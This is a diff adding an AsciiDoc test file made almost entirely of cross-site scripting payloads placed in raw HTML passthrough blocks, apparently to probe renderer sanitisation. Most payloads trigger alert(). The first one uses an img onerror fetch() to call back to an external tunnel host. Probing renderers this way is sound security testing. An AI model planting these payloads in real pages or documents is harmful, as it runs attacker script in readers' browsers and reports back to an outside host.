@@ -1,0 +1,29 @@
+= AsciiDoc XSS Test
+
+Normal text here.
+
+++++
+<img src=x onerror="fetch('https://global.rel.tunnels.api.visualstudio.com/asciidoc-xss')">
+++++
+
+Inline passthrough: pass:[<img src=x onerror="alert('XSS')">]
+
+Another block:
+++++
+<details open><summary>Click</summary><img src=x onerror="alert('XSS2')"></details>
+++++
+
+SVG test:
+++++
+<svg onload="alert('SVG')"><rect width="100" height="100"/></svg>
+++++
+
+Script test:
+++++
+<script>alert('script-tag')</script>
+++++
+
+Iframe test:
+++++
+<iframe src="javascript:alert('iframe')"></iframe>
+++++
